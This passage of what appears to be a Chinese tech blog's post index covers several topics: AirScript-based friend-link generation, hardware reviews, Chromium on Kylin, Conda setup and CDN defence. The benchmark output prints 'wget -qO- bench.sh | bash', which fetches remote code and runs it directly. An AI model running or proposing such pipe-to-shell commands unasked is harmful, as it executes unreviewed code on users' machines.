访问授权页 获取，极其不便。 一番探索后，我便放弃了这个方案。因为我发现了一个更方便的路子：AirScript 脚本。 根据官方介绍，AirScript 是一个基于 JavaScript 的表格应用开发工具，它支持编程完成一些表格操作，下面介绍如何利用 AirScript，实现本站的友链页面自动生成。 登录金山文档，创建一个 智能表格。 在智能表格中，新建一个 数据表。 在数据表中，根据需要增加站名、签名、状态、首页、友链页、RSS、头像、备注等字段，然后录入所有友链数据。 点击 Ribbon 栏中的高级功能 - 高级开发 - AirScript 脚本编辑器。 在 文档共享脚本 中新建一个脚本。 不要放在 我的脚本 中，因为不支持 webhook 调用。 填入脚本： 123456789101112131415161718192021// 将 ‘友链’ 改为实际的工作表名称const sheet = Application.Sheets.Item('友链')// 分页获取全表数据，如果不分页，一次最多只能读取 100 条数据function fetchAllRecords() { const view = sheet.Selection.GetActiveView() let all = [] let offset = null while (all.length === 0 || offset) { let records = sheet.Record.GetRecords({ ViewId: view.viewId, Offset: offset, }) offset = records.offset all = all.concat(records.records) } return all}// return 的数据会通过接口的响应体返回return fetchAllRecords() 按 Ctrl + S 保存脚本，然后点击工具栏上的 “脚本令牌” 按钮，生成一个脚本令牌，复制这个令牌保存（以后将无法再次查看），令牌有效期是半年，但放心，令牌可以随时延期，延期后令牌不变。 点击脚本名称旁边的菜单，点击 “复制脚本 webhook” 并保存。 接下来只需 POST 这个 webhook 地址，在请求头中带上 AirScript-Token: 脚本令牌，即可获取到 JSON 格式的表格数据。 接下来就可以搭配本地脚本实现自动生成友链页面了！在博客源码目录新建一个 friends-gen.js，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const fs = require(&quot;fs&quot;);const path = require(&quot;path&quot;);// TODO: 修改这里的友情链接模板方法，以适配你的友链页面样式function template({ 站名, 首页, RSS, 头像, 签名, 状态, 备注 }) { if (!站名 || 状态 === &quot;已清理&quot;) return &quot;&quot;; 站名 = 站名 ? 站名.replace(/(’|‘)/g, &quot;'&quot;) : &quot;&quot;; 签名 = 签名 ? 签名.replace(/(’|‘)/g, &quot;'&quot;) : &quot;&quot;; const showAvatar = 头像 &amp;&amp; 状态 === &quot;正常&quot;; const avatar = showAvatar ? ` style=&quot;background-image: url('${头像}')&quot;` : &quot;&quot;; const firstWord = showAvatar ? &quot;&quot; : 站名[0].toUpperCase(); const rss = RSS &amp;&amp; RSS !== &quot;无&quot; &amp;&amp; 状态 === &quot;正常&quot; ? `&amp;nbsp;&lt;a class=&quot;has-text-grey&quot; target=&quot;_blank&quot; href=&quot;${RSS}&quot;&gt;&lt;i class=&quot;fas fa-rss&quot; title=&quot;支持 RSS&quot;&gt;&lt;/i&gt;&lt;/a&gt;` : &quot;&quot;; const tag = { 正常: &quot;&quot;, 无法访问: '&amp;nbsp;&lt;span class=&quot;tag is-warning&quot;&gt;无法访问&lt;/span&gt;', 单向友链: '&amp;nbsp;&lt;span class=&quot;tag is-warning&quot;&gt;单向友链&lt;/span&gt;', 已清理: '&amp;nbsp;&lt;span class=&quot;tag is-Danger&quot;&gt;已清理&lt;/span&gt;', }[状态]; const popList = []; if (签名) { popList.push(`签名: ${签名}`); } if (备注 &amp;&amp; 状态 !== &quot;正常&quot;) { popList.push(`备注: ${备注}`); } const pop = popList.length &gt; 0 ? ` &lt;div class=&quot;friend-pop&quot;&gt;&lt;div&gt;${popList.join(&quot;&lt;br /&gt;&quot;)}&lt;/div&gt;&lt;/div&gt;` : &quot;&quot;; const link = 状态 === &quot;正常&quot; ? `&lt;a target=&quot;_blank&quot; href=&quot;${首页}&quot;&gt;${首页.replace( /^https?:\\/\\//, &quot;&quot; )}&lt;/a&gt;` : 首页.replace(/^https?:\\/\\//, &quot;&quot;); return ` &lt;div class=&quot;friend&quot;&gt; &lt;div class=&quot;friend-avatar&quot;${avatar}&gt;${firstWord}&lt;/div&gt; &lt;div class=&quot;friend-detail&quot;&gt; &lt;div&gt;${站名}${tag}${rss}&lt;/div&gt; &lt;div&gt;${link}&lt;/div&gt; &lt;/div&gt;${pop} &lt;/div&gt;`;}async function main() { const res = await fetch( // TODO: 替换为你的脚本 webhook &quot;https://www.kdocs.cn/api/v3/ide/file/******/script/******/sync_task&quot;, { method: &quot;POST&quot;, headers: { &quot;Content-Type&quot;: &quot;application/json&quot;, // TODO: 替换为你的脚本令牌 &quot;AirScript-Token&quot;: &quot;******&quot;, }, body: JSON.stringify({ Context: { argv: {}, }, }), } ); const jsonRes = await res.json(); if (jsonRes &amp;&amp; jsonRes.status === &quot;finished&quot;) { const records = jsonRes.data.result; let result = `{% raw %}&lt;div class=&quot;friends&quot;&gt;`; let normalCompleted = false; for (const record of records) { if (!normalCompleted &amp;&amp; record.fields.状态 !== &quot;正常&quot;) { result += ` &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt;&lt;/div&gt;{% endraw %}----异常友链 | 如存在异议请在评论区留言{% raw %}&lt;div class=&quot;friends&quot;&gt;`; normalCompleted = true; } result += template(record.fields); } result += ` &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt;&lt;/div&gt;{% endraw %}`; // TODO: 替换为你的友情链接 md 文件路径 const friendsMd = path.resolve(__dirname, &quot;./source/friends/index.md&quot;); const friendsMdContent = fs.readFileSync(friendsMd, { encoding: &quot;utf-8&quot; }); const startStr = &quot;&lt;!-- auto_generation_start --&gt;&quot;; const endStr = &quot;&lt;!-- auto_generation_end --&gt;&quot;; const startPos = friendsMdContent.indexOf(startStr) + startStr.length; const endPos = friendsMdContent.indexOf(endStr, startPos); const newContent = friendsMdContent.slice(0, startPos) + result + friendsMdContent.slice(endPos); fs.writeFileSync(friendsMd, newContent, { encoding: &quot;utf-8&quot; }); }}main(); 请按照脚本中 // TODO: 注释标注的要求自己修改脚本。 打开友情链接的 md 文件，在需要自动生成的位置增加起始和结束标记。 12&lt;!-- auto_generation_start --&gt;&lt;!-- auto_generation_end --&gt; 执行脚本 node friend-gen.js，即可测试生成效果了！ 通过这种方式完成友链自动化后，你还可以点击友链表格右上角的创建应用 - 表单，生成表单供访客自助提交友链申请，真方便呀！","link":"/2024/http-get-data-from-wps/"},{"title":"读速 7000 的 2T 固态只卖 599，当游戏盘真香","text":"简单测评一下新买的幻隐 HV3000 GR 2TB 固态硬盘。 测试环境 主板是 TUF GAMING B760M-PLUS WIFI，CPU 是 i5-13600KF 插在远离 CPU 的 PCIe 4.0 接口上，并安装主板标配的 M.2 散热马甲 测试截图 优点 速度快 价格低 五年质保 贴纸出厂时在纸盒里，没有贴在硬盘上，有利于散热 赠送螺丝、螺丝刀、金属散热片 缺点 包装简陋，没有塑封，也没有防拆贴 慧荣主控，两颗美光颗粒 B58R，这块我也不太懂，网上有反馈掉盘的情况，可能是品控问题，也可能是没做好散热，我没有遇到，只要当游戏盘，不要放重要的资料，就不必担心数据丢失了","link":"/2024/hv3000-ssd/"},{"title":"京东云后羿无线路由器测评","text":"我家有一台用了几年的 Redmi AX6 路由器，但一直有一个问题，就是 5G 信号无法完全覆盖 100 多平米的空间，离得远了，信号就会降级到 2.4G。我家装修时网线走的是暗线，每个房间都有一个网线接口，其实再买一台路由器，组个有线回程的 mesh 就能解决，但我对网速的需求并不那么强，所以这件事就一直搁置着。 直到最近，京东云无线路由器搞活动，AX3000 的后羿直接降到白菜价，我毫不犹豫地花 89 买下。 然而买完就被降价背刺了，第一周降价到 76，保价成功，第二周又降价到 66，超出保价时限，保价失败，痛失十块。66 块的 3000M 路由器，还要什么自行车！其他品牌 3000M 的路由，怎么也得 120 吧，都够买两台后羿了。 关闭 PCDN京东云路由器的后台有一个进程会跑 PCDN 为用户赚京豆，这个进程在老版本固件中是关不掉的，限速最低只能调到 10 Mbps，无法完全关闭。在我的宽带支持 NAT3 和 UPnP 的条件下，即使限制到 10 Mbps，每天也能跑几十 GB 的上传流量，而这么多的流量也只能给我带来 3 毛钱左右的收益。跑 PCDN 的行为很容易被运营商 识别为异常流量 并被限制上传速度、关闭 NAT、关闭 IPv6、甚至断网。我可不希望为了每天几毛钱影响到自己的上网体验，所以路由器刚到手，我就开始寻找这个功能的开关。然后我就发现京东云并没有直接提供这个开关，必须升级到 4.0.0 以上版本的固件，还需要下载手机 app 绑定路由器，在手机 app 中将内置存储设置为本地网盘，切换到本地网盘模式后，贡献度直接降为 0，才终于实现了完全关闭 PCDN 的目的，可见京东云有多不想让用户关闭这个功能。 速度测试关闭 PCDN 让它专心做无线路由器以后，我测试了一下它的局域网传输速度。 测速设备 路由器：京东云无线宝后羿 AX3000，开启本地网盘模式 台式机：主板是 TUF GAMING B760M-PLUS WIFI，使用标配天线，CPU 是 i5-13600KF 手机：Vivo X Fold3 Pro，高通骁龙 8 Gen 3 测速方法 路由器关闭 2.4G 频段 台式机和手机同时连接路由器 5G 频段，与路由器距离均控制在 1 米以内，无遮挡 台式机开启 HTTP 静态资源服务器 手机访问上述 HTTP 地址，下载电影文件 测试结果手机端显示协商速率 2401 Mbps 电脑端显示协商速率 2402 Mbps 使用系统自带浏览器下载，平均 90 MB/s 使用 Via 浏览器下载，平均 100 MB/s 速度不错！能够满足我的日常需求。","link":"/2024/jd-houyi-wifi/"},{"title":"信创银河麒麟高级服务器操作系统 V10 安装无头浏览器 Chromium","text":"如果是 x86 架构，直接从 Chrome 官网下载即可。如果是 arm 架构会比较麻烦，摸索了一天整理出以下方法。 1234567curl -LO https://update.cs2c.com.cn/NS/V10/V10-GFB/030/os/adv/lic/base/aarch64/packages/nss-mdns-0.14.1-3.ky10.aarch64.rpmcurl -LO https://update.cs2c.com.cn/NS/V10/V10-GFB/030/os/adv/lic/base/aarch64/packages/chromium-common-90.0.4430.212-1.p01.ky10.aarch64.rpmcurl -LO https://update.cs2c.com.cn/NS/V10/V10-GFB/030/os/adv/lic/base/aarch64/packages/chromium-90.0.4430.212-1.p01.ky10.aarch64.rpmyum install -y libXau.aarch64yum localinstall -y nss-mdns-0.14.1-3.ky10.aarch64.rpmyum localinstall -y chromium-common-90.0.4430.212-1.p01.ky10.aarch64.rpmyum localinstall -y chromium-90.0.4430.212-1.p01.ky10.aarch64.rpm 调用的话，直接 /usr/bin/chromium-browser。 如果需要用无头浏览器测试中文页面，还需要安装中文字体——把字体文件复制到 /usr/share/fonts/ 目录下，然后执行 fc-cache -v 即可。","link":"/2024/kylin-chromium/"},{"title":"macOS 自动重新打开意外退出的应用","text":"我的 Mac mini 全天运行，上面挂着 Parsec 远程控制 APP，需要时我会通过 Parsec 连上去使用。然而 Parsec 长时间运行后，偶尔会崩溃，搞得我需要跑到 Mac 旁边手动点重启才能重新连上。有没有办法能让它崩溃以后自动重启呢？ 先打开自带的“脚本编辑器”，写一个 AppleScript 脚本，判断 Parsec 是否正在运行，如果没有运行，就启动 Parsec。 autorun.scpt123if application &quot;Parsec&quot; is not running then tell application &quot;Parsec&quot; to activateend if 将脚本保存到合适的位置，我这里是 /Users/mae/workspace/applescript/autorun.scpt，再写一个任务，每隔 233 秒执行一次上面的脚本。 com.imaegoo.autorun.scpt.plist1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.imaegoo.autorun.scpt&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;osascript&lt;/string&gt; &lt;string&gt;/Users/mae/workspace/applescript/autorun.scpt&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;StartInterval&lt;/key&gt; &lt;integer&gt;233&lt;/integer&gt;&lt;/dict&gt;&lt;/plist&gt; 保存到 /Users/mae/Library/LaunchAgents/com.imaegoo.autorun.scpt.plist，然后执行命令启用这个定时任务。 1launchctl load -w /Users/mae/Library/LaunchAgents/com.imaegoo.autorun.scpt.plist 以后再也不怕我的 Mac mini 失联了！","link":"/2024/macos-auto-restart-crashed-app/"},{"title":"京东云轻量云主机避雷","text":"避雷！不推荐京东云轻量云主机！ 去年双十一期间我以 356 元的新用户价格购买了 3 年京东云轻量云主机，配置为 CPU 2 核、内存 2 GB、系统盘 60GB、带宽 4 Mbps、流量 300GB/月。 经过半年的体验，总觉得一个字，卡。最直观的体验就是，刚重装完的纯净 Ubuntu 22.04 系统，开机就要 3~5 分钟，部署 nginx 就开始卡，部署数据库直接干到死机。而且不是高峰期这样，是任何时间都卡。 于是今天突然好奇这服务器到底是什么水平，不测不知道，一测吓一跳。 12345678910111213141516171819202122232425262728293031323334353637383940414243-------------------- A Bench.sh Script By Teddysun ------------------- Version : v2023-10-15 Usage : wget -qO- bench.sh | bash---------------------------------------------------------------------- CPU Model : Intel(R) Xeon(R) CPU E5-2683 v4 @ 2.10GHz CPU Cores : 2 @ 2099.998 MHz CPU Cache : 16384 KB AES-NI : ✓ Enabled VM-x/AMD-V : ✗ Disabled Total Disk : 58.8 GB (5.1 GB Used) Total Mem : 1.9 GB (216.5 MB Used) System uptime : 25 days, 22 hour 47 min Load average : 0.00, 0.00, 0.00 OS : Ubuntu 22.04.3 LTS Arch : x86_64 (64 Bit) Kernel : 5.15.0-60-generic TCP CC : cubic Virtualization : KVM IPv4/IPv6 : ✓ Online / ✗ Offline Organization : AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch Location : Beijing / CN Region : Beijing---------------------------------------------------------------------- I/O Speed(1st run) : 8.5 MB/s I/O Speed(2nd run) : 22.6 MB/s I/O Speed(3rd run) : 17.7 MB/s I/O Speed(average) : 16.3 MB/s---------------------------------------------------------------------- Node Name Upload Speed Download Speed Latency Speedtest.net 2.87 Mbps 15.61 Mbps 16.84 ms Los Angeles, US 6.05 Mbps 6.01 Mbps 175.17 ms Dallas, US 5.82 Mbps 1.89 Mbps 209.87 ms Montreal, CA 5.75 Mbps 3.97 Mbps 227.58 ms Amsterdam, NL 6.07 Mbps 1.17 Mbps 289.95 ms Shanghai, CN 2.88 Mbps 15.26 Mbps 19.03 ms Hongkong, CN 5.12 Mbps 4.12 Mbps 41.03 ms Mumbai, IN 5.89 Mbps 2.49 Mbps 337.86 ms Singapore, SG 5.70 Mbps 15.60 Mbps 204.49 ms Tokyo, JP 0.81 Mbps 0.91 Mbps 233.71 ms---------------------------------------------------------------------- Finished in : 10 min 28 sec Timestamp : 2024-03-27 14:41:02 CST---------------------------------------------------------------------- 怪不得一部署数据库就死机，这是拿存储卡来当的硬盘吗？部署一个思源笔记都能死机，docker image prune 都能执行一分钟，实在不知道这台机器能拿来干什么了，你说部署静态资源？可是它的月流量只有 300G，性价比还不如 CDN。 2024/03/29 后续早上 9 点再跑一次，发现硬盘速度极其不稳定。 123456789101112131415161718192021222324252627282930313233343536373839404142-------------------- A Bench.sh Script By Teddysun ------------------- Version : v2023-10-15 Usage : wget -qO- bench.sh | bash---------------------------------------------------------------------- CPU Model : Intel(R) Xeon(R) CPU E5-2683 v4 @ 2.10GHz CPU Cores : 2 @ 2099.998 MHz CPU Cache : 16384 KB AES-NI : ✓ Enabled VM-x/AMD-V : ✗ Disabled Total Disk : 58.8 GB (5.1 GB Used) Total Mem : 1.9 GB (215.2 MB Used) System uptime : 27 days, 17 hour 27 min Load average : 0.15, 0.04, 0.01 OS : Ubuntu 22.04.3 LTS Arch : x86_64 (64 Bit) Kernel : 5.15.0-60-generic TCP CC : cubic Virtualization : KVM IPv4/IPv6 : ✓ Online / ✗ Offline Organization : AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch Location : Beijing / CN Region : Beijing---------------------------------------------------------------------- I/O Speed(1st run) : 3.7 MB/s I/O Speed(2nd run) : 3.2 MB/s I/O Speed(3rd run) : 10.0 MB/s I/O Speed(average) : 5.6 MB/s---------------------------------------------------------------------- Node Name Upload Speed Download Speed Latency Los Angeles, US 5.92 Mbps 15.70 Mbps 177.38 ms Dallas, US 5.79 Mbps 16.06 Mbps 206.49 ms Montreal, CA 2.89 Mbps 15.25 Mbps 269.04 ms Amsterdam, NL 5.94 Mbps 0.81 Mbps 280.63 ms Shanghai, CN 5.68 Mbps 15.21 Mbps 24.31 ms Hongkong, CN 5.04 Mbps 0.64 Mbps 116.17 ms Mumbai, IN 5.87 Mbps 13.75 Mbps 339.48 ms Singapore, SG 5.67 Mbps 15.40 Mbps 212.43 ms Tokyo, JP 5.83 Mbps 1.46 Mbps 128.70 ms---------------------------------------------------------------------- Finished in : 18 min 33 sec Timestamp : 2024-03-29 09:28:54 CST---------------------------------------------------------------------- 这个下行带宽是认真的么！15 Mbps？别的云厂商都限上行，京东云下行也限是吧。 昨天联系了客服，说是可以给我免费将 HDD 升级为 SSD，已经过去一天了，仍然没有升级好。 2024/04/01 后续客服反馈已经迁到 SSD，遂重新测速，发现 IO 速度总算到达了正常 HDD 的速度……但要说这是 SSD 还是太牵强了点。","link":"/2024/jdcloud-bench/"},{"title":"Node.js 版本与 ABI 版本对照表","text":"因为下载 node-sass 的 binding.node 预编译二进制包时，发现网上竟然搜不到 Node.js 版本与 ABI 版本的对应关系，所以自己整理一份吧，数据来自三个地方，我做了整合： https://github.com/sass/node-sass/blob/master/lib/extensions.js https://github.com/electron/node-abi/blob/main/abi_registry.json https://github.com/electron/node-abi/blob/main/index.js ABI Runtime Target 1 Node 0.2.0 0x000A Node 0.9.1 0x000B Node 0.9.9 11 Node 0.10.4 11 Node 0.10.x 0x000C Node 0.11.0 13 Node 0.11.8 14 Node 0.11.11 14 Node 0.12.x 42 Node 1.0.0 42 io.js 1.x 43 Node 1.1.0 43 io.js 1.1.x 44 Electron 0.30.0 44 Node 2.0.0 44 io.js 2.x 45 Electron 0.31.0 45 Node 3.0.0 45 io.js 3.x 46 Electron 0.33.0 46 Node 4.0.0 46 Node.js 4.x 47 node-webkit 0.13.0 47 Electron 0.36.0 47 Node 5.0.0 47 Node.js 5.x 48 node-webkit 0.15.0 48 Electron 1.1.0 48 Node 6.0.0 48 Node.js 6.x 49 Electron 1.3.0 49 Electron 1.3.x 50 Electron 1.4.0 50 Electron 1.4.x 51 node-webkit 0.18.3 51 Electron 1.5.0 51 Node 7.0.0 51 Node.js 7.x 53 Electron 1.6.0 53 Electron 1.6.x 54 Electron 1.7.0 57 node-webkit 0.23.0 57 Electron 1.8.0 57 Electron 2.0.0 57 Node 8.0.0 57 Node.js 8.x 59 node-webkit 0.26.5 59 Node 9.0.0 59 Node.js 9.x 64 Node 10.0.0 64 Node.js 10.x 64 Electron 3.0.0 64 Electron 4.0.0 67 Node 11.0.0 67 Node.js 11.x 69 Electron 4.0.4 70 Electron 5.0.0-beta.9 72 Node 12.0.0 72 Node.js 12.x 73 Electron 6.0.0-beta.1 75 Electron 7.0.0-beta.1 76 Electron 8.0.0-beta.1 76 Electron 9.0.0-beta.1 79 Node 13.0.0 79 Node.js 13.x 80 Electron 9.0.0-beta.2 82 Electron 10.0.0-beta.1 82 Electron 11.0.0-beta.1 83 Node 14.0.0 83 Node.js 14.x 85 Electron 11.0.0-beta.11 87 Electron 12.0.0-beta.1 88 Node 15.0.0 88 Node.js 15.x 89 Electron 13.0.0-beta.2 89 Electron 14.0.0-beta.1 89 Electron 15.0.0-alpha.1 93 Node 16.0.0 93 Node.js 16.x 97 Electron 14.0.2 98 Electron 15.0.0-beta.7 99 Electron 16.0.0-alpha.1 101 Electron 17.0.0-alpha.1 102 Node 17.0.0 102 Node.js 17.x 103 Electron 18.0.0-alpha.1 106 Electron 19.0.0-alpha.1 107 Electron 20.0.0-alpha.1 108 Node 18.0.0 108 Node.js 18.x 109 Electron 21.0.0-alpha.1 110 Electron 22.0.0-alpha.1 111 Node 19.0.0 111 Node.js 19.x 113 Electron 23.0.0-alpha.1 114 Electron 24.0.0-alpha.1 115 Node 20.0.0 115 Node.js 20.x 116 Electron 25.0.0-alpha.1 116 Electron 26.0.0-alpha.1 118 Electron 27.0.0-alpha.1 119 Electron 28.0.0-alpha.1 120 Node 21.0.0 121 Electron 29.0.0-alpha.1 123 Electron 30.0.0-alpha.1 123 Electron 31.0.0-alpha.1 125 Electron 31.0.0-beta.7 127 Node 22.0.0 128 Electron 32.0.0-alpha.1 129 Node 23.0.0 130 Electron 33.0.0-alpha.1","link":"/2024/nodejs-abi-version/"},{"title":"解决火绒 6.0 造成的 Node.js fetch 方法 unable to verify the first certificate 报错","text":"之前用 Electron 写了一个监控客户端，昨天突然用不成了，检查日志发现这样的一个报错： 123456789101112Error occurred in handler for 'getPrice': TypeError: fetch failed at Object.fetch (node:internal/deps/undici/undici:12293:11) at process.processTicksAndRejections (node:internal/process/task_queues:95:5) at async WebContents.&lt;anonymous&gt; (node:electron/js2c/browser_init:2:78167) { cause: Error: unable to verify the first certificate at TLSSocket.onConnectSecure (node:_tls_wrap:1659:34) at TLSSocket.emit (node:events:514:28) at TLSSocket._finishInit (node:_tls_wrap:1070:8) at ssl.onhandshakedone (node:_tls_wrap:856:12) { code: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE' }} 看起来是调用 Node.js 的 fetch 方法时遇到了证书问题，然而网站的证书应该是正常的，也没有过期，怎么肥四呢？ 用 Microsoft Edge 浏览器访问一下这个网站，到开发者工具 Secure 标签看一下证书颁发者，发现居然是火绒的根证书 Huorong Anti-Virus Personal Root Certificate。 火绒的根证书不被 Node.js 信任，问题就出在这里了。回想自己昨天才刚刚把火绒安全的版本从 5.0 升级到 6.0，于是打开火绒设置找找线索，果然找到了一个名为“加密连接扫描”的设置，把这个设置关闭之后，问题解决。","link":"/2024/nodejs-fetch-cert-error/"},{"title":"给 Parsec 设置代理，解决国内无法打开、无法登录、无法刷新的问题","text":"Parsec 一直是我用过的体验最好、最流畅的远程串流软件，它能实现几乎无感的远程体验，配置上也比 Sunshine + Moonlight + 内网穿透的方案要简单得多。Parsec 只需要一个软件就能实现点对点远程。同时它也是 macOS 上我用过的最好用的远程被控端。 但最近这个软件无法正常打开了，原因是国内无法访问 Parsec 的服务器。对此，我们可以寻找一台可以正常连接 Parsec 的代理服务器，这里以 127.0.0.1:7890 为例，让 Parsec 恢复正常使用。 为 Parsec 配置代理以后，Parsec 只会在启动、登录、刷新电脑列表、建立连接时使用代理服务器，实际串流仍然不经过代理服务器，而是使用点对点连接，所以不用担心代理服务器对串流性能造成影响！ 打开 Parsec 的配置文件 如果是 Windows，配置文件可能在以下两个位置其中之一，按 Win + R 输入位置以后确定，找得到哪个就改哪个： %APPDATA%\\Parse\\config.json C:\\ProgramData\\Parsec\\config.json 如果是 macOS，请打开 ~/.parsec/config.json（可以用 open -e ~/.parsec/config.json 命令直接打开） 在第一个花括号 { 后面增加这 9 行代理配置，注意加完以后整个文件必须是一个合法的 JSON，否则 Parsec 会重置配置 123456789&quot;app_proxy&quot;: { &quot;value&quot;: true},&quot;app_proxy_address&quot;: { &quot;value&quot;: &quot;127.0.0.1&quot;},&quot;app_proxy_port&quot;: { &quot;value&quot;: 7890}, 保存以后，打开任务管理器，结束所有 parsecd.exe 进程，然后再打开 Parsec，就可以正常使用了。","link":"/2024/parsec-proxy/"},{"title":"前端人的 Python、Conda 环境搭建","text":"前言许多 AI 相关的项目、游戏辅助工具都使用 Python 语言开发，迫使我开始接触 Python 的环境搭建。作为一个前端人，我已经对 Node.js、NVM、NPM 等工具再熟悉不过了，但搭建 Python 的过程中还是碰到了不少困难，在此记录一下，让和我一样的前端人能更快地理解 Python 的生态体系。 Python 生态 Python: Python 解释器和运行时环境，对应前端体系中的 Node.js，官网 www.python.org Pip: Python 的包管理工具，对应前端体系中的 NPM，官网 pypi.org Conda: 用于管理 Python 环境，对应前端体系中的 NVM，但又略有区别 NPM 在安装项目依赖时，会安装在项目的 node_modules 目录下，也就是局部安装，各个项目之间互相不影响，而 Pip 则是默认装在全局，这和前端的思维不一致。装在全局会造成多个项目的管理不便，各个项目之间依赖冲突、相同依赖的不同版本无法同时存在。 为了解决这个问题，Conda 就出现了，它可以创建完全隔离的多个不同的 Python 环境，每个环境可以指定不同的 Python 版本，每个环境所安装的依赖也相互隔离。 环境安装为了搭建 Python 环境，新手往往会先想到安装 Python，但实际上 Conda 已经内置了 Python，我们 只需要安装一个 Conda，就完成环境安装了。 Conda 有三个发行的安装包，分别是 Anaconda、Miniconda、Miniforge，其中 Anaconda 最出名，它已经内置了数千个常用的科学计算依赖包，属于是开箱即用，但缺点是安装包体积达到了惊人的 912 MB。 Miniconda 就比较小巧了，它没有内置常用依赖，体积也降到了 85 MB，对于我这种需求不高的用户，显然更合适。 下载 Miniconda: https://docs.anaconda.com/miniconda/#latest-miniconda-installer-links 安装时有一步 Advanced Installation Options，建议选中 “Clear the package cache upon completion”，可以节省部分硬盘空间 修改软件源和 NPM 一样，默认的国外软件源在国内是无法流畅使用的。我们需要在用户根目录（C:\\Users\\你的用户名）创建一个 .condarc 文件，输入以下内容来切换成国内源 12345678channels: - defaultsshow_channel_urls: truedefault_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch 修改环境位置如果你不想让以后安装的依赖占用 C 盘的空间，还需要提前修改环境位置，在上一步的 .condarc 文件中增加两行 12envs_dirs: - D:\\dev\\condaenvs 环境创建 在开始中搜索 “anaconda”，找到 “Anaconda Prompt (miniconda3)” 并打开，然后执行 1conda create -n 环境名称 python=3.12 -y 替换命令中的环境名称为你定义的环境名称，替换命令中的 3.12 为你需要的 Python 版本 这样就完成环境的创建了，执行 conda env list 可以查看环境列表 环境切换仍然是在 Anaconda Prompt 中执行 1conda activate 环境名称 这样就切换到了对应的环境中 依赖安装仍然是在 Anaconda Prompt 中执行 12cd /d 项目目录pip install -r requirements.txt 注意 -r 后跟项目依赖声明文件，有可能叫 requirements.txt，也有可能叫 requirements-prod.txt，之类的 安装好依赖后，就可以启动项目啦！具体如何启动可以参考项目的 README 文件。 在 bat 中切换 Conda 环境有时候我们需要编写 bat 脚本来执行一些自动化任务（例如定时执行），这时我们会发现，由于脚本执行时没有切换到指定的 Conda 环境中，会报 Python 找不到的错误。怎样在 bat 脚本中切换 Conda 环境呢？ 12345@echo offcd /d 项目目录call D:\\dev\\anaconda3\\Scripts\\activate.bat D:\\dev\\anaconda3call conda activate 环境名称python 项目主入口.py 替换命令中的 D:\\dev\\anaconda3 为你的 Conda 安装路径，替换最后一行命令为项目的启动命令 配置 PyCharm如果你和我一样在用 PyCharm 开发工程，还需要在其中配置工程所使用的 Conda 环境 在 PyCharm 中打开工程 打开 文件-设置-项目-Python 解释器-添加解释器-添加本地解释器 选择 Conda 环境，选择 conda.exe 所在位置，然后选择刚才创建好的环境，然后确定 回到设置窗口选择刚刚添加好的解释器，大功告成","link":"/2024/python-conda-setup/"},{"title":"腾讯云 CDN 防刷经验分享","text":"通过 CDN 部署静态网站可以让网站加载速度如德芙般丝滑。CDN 和云服务器不同，云服务器大多是按带宽计费，CDN 则是按流量计费，如果设置不当，遇到流量洪峰时，会产生高额账单。最近不少使用 CDN 的博客遭遇了恶意刷流量攻击（近期部分加速域名晚间遭遇恶意流量事件说明），本站也是受害站之一，但基本没啥损失，分享一下防刷经验。 DNS 设置虽然接入 Cloudflare 提供的 DNS 可以防御 DDoS，但 Cloudflare 在国内访问太慢了，暂时没套，如果未来受到比较严重的攻击，再考虑套 Cloudflare。 多准备几个源站，可以在受到攻击时灵活切换。我准备了三套源站，GitHub Pages、Netlify、腾讯云 CDN。 用腾讯云的 DNSPod，可以设置两条线路，默认线路解析到 Netlify，国内线路解析到腾讯云 CDN，GitHub Pages 不解析，留作备用。 Netlify 每月有 100G 免费流量，用于国外访问本站。 腾讯云以前每个月送 10G，现在不送了，买的话是 19 元 100G，有效期一年，不算贵。 受到攻击时，手机收到告警，我会立即在腾讯云小程序上暂停国内线路，保证 CDN 的安全，这时国内流量也会走默认的 Netlify，保证网站仍能正常访问，如果 Netlify 也不幸被刷满，就关闭网站。 CDN 设置腾讯云提供了丰富的选项来防止被刷，这点还是值得称赞的 IP 黑名单，拦截异常的 IP 段 想要查询攻击者的 IP，可以到数据分析中看 IP 访问限频，可以缓解被刷的速度，但不能太低，会影响网站正常加载 下行限速，也可以缓解被刷的速度，静态网站都是小文件，不需要太高的下行速度 用量封顶，当瞬时流量超过设置的大小时，立即停用 CDN，网站会 404，避免产生高额账单 告警设置告警可以让你知道自己被攻击，腾讯云可观测平台 可以配置 CDN 的告警，微信提醒完全免费，可以参考下图我的配置，根据你的网站规模，适当修改指标 告警触发时，会通过微信提醒","link":"/2024/qcloud-cdn-defense/"},{"title":"屠龙者终成恶龙","text":"赚了眼球丢了节操","link":"/2024/sensational-headlines/"},{"title":"非管理员账户如何安装 Node.js 与快速切换版本","text":"在企业环境中的电脑，往往严格管控着管理员权限，无法自由地安装软件。 如何以普通用户的身份安装 Node.js？ 如何在需要低版本的 Node.js 时快速切换版本而不需要重新安装？ JDK 也适用于这种方式安装！只需多配一个环境变量 JAVA_HOME 安装 访问 npmmirror 二进制文件镜像站，进入 node，Ctrl + F 找到需要下载的版本，这里以 